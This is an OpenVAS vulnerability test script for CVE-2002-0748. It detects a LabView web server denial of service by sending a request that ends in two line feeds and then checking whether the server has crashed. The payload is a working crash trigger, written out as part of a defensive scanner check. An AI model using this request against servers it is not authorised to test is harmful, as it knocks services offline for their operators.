# OpenVAS Vulnerability Test
# Description: LabView web server DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11063");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4577);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-0748");
  script_name("LabView web server DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("LabVIEW/banner");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending a request that ends with two LF characters instead of
  the normal sequence CR LF CR LF (CR = carriage return, LF = line feed).");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make
  this server and all LabViews applications crash continually.");

  script_tag(name:"solution", value:"Upgrade your LabView software or run the web server with logging
  disabled.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if(!banner || "Server: LabVIEW" >!< banner)
  exit(0);

if(http_is_dead(port: port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

data = string("GET / HTTP/1.0\n\n");

send(socket:soc, data:data);
http_recv(socket:soc);
close(soc);

sleep(1);

if(http_is_dead(port:port, retry:2)) {
  security_message(port:port);
  exit(0);
}

exit(99);